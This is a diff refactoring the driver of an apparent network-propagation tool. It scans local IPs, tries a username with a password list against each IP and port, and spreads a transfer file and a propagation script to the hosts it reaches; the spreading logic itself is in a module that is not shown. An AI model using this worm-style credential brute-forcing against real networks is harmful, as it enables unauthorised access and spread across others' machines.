@@ -4,6 +4,8 @@
 import logging
 # Importing net_propagation for propagating across the network.
 import net_propagation
+# Importing file for working with files.
+import file
 # Importing strings for use of the external strings resources.
 import strings
 # Importing sys to make OS calls and use OS level utilities.
@@ -23,7 +25,7 @@ def demo():
         sys.exit(-1)
 
     # Just initialising this for use later.
-    transfer_file_filename = strings.SPACE
+    transfer_file = strings.SPACE
 
     # Validating and assigning values based on arguments passed in.
     valid_values = net_propagation.checking_arguments(arguments)
@@ -45,17 +47,18 @@ def demo():
         logging.info(strings.PERFORMING_LOCAL_SCAN)
         ip_list = net_propagation.gathering_local_ips(ip_list)
 
+    # Creating the password file.
+    password_file = file.File(strings.PWDS_LIST_SHORT)
     try:
         # Here I made sure the user actually gave a valid file for the
         # passwords list. If they have...
-        net_propagation.validate_file_exists(passwords_filename)
+        password_file.validate_file_exists()
         # A list of passwords is created.
-        password_list = \
-            net_propagation.convert_file_to_list(passwords_filename)
+        password_list = password_file.convert_file_to_list()
     except RuntimeError:
         # File doesn't exist, alert the user and exit gracefully, so
         # they can possibly fix their mistake.
-        net_propagation.file_error_handler()
+        password_file.file_error_handler()
         sys.exit(-1)
 
     # If the user wants to transfer a file, this stuff should be done...
@@ -67,12 +70,17 @@ def demo():
                 strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE) + 1]
             # Again making sure the transfer file actually exits, just like
             # the password file above.
-            net_propagation.validate_file_exists(transfer_file_filename)
+            transfer_file = file.File(transfer_file_filename)
+            transfer_file.validate_file_exists()
         except RuntimeError:
             # File doesn't exist, throw an error and give the user a chance to
             # try again.
-            net_propagation.file_error_handler()
+            transfer_file_filename = arguments[arguments.index(
+                strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE) + 1]
+            transfer_file = file.File(transfer_file_filename)
+            transfer_file.file_error_handler()
             sys.exit(-1)
+
     # Removing duplicate entries in the IP address list, can come from
     # combining local scan with given IP addresses in an ip address file for
     # example. This would be a user error, we're just handling that.
@@ -87,10 +95,11 @@ def demo():
     for ip in ip_list:
         # And then using all user specified ports against that specific IP...
         for port in ports:
+            propagation_script = file.File(strings.DEMO_SCRIPT_FILENAME)
             # Try to spread using services and actions.
             net_propagation.try_action(ip, port, target_username,
-                                       password_list, transfer_file_filename,
-                                       arguments)
+                                       password_list, transfer_file.filename,
+                                       propagation_script.filename, arguments)
 
 
 demo()
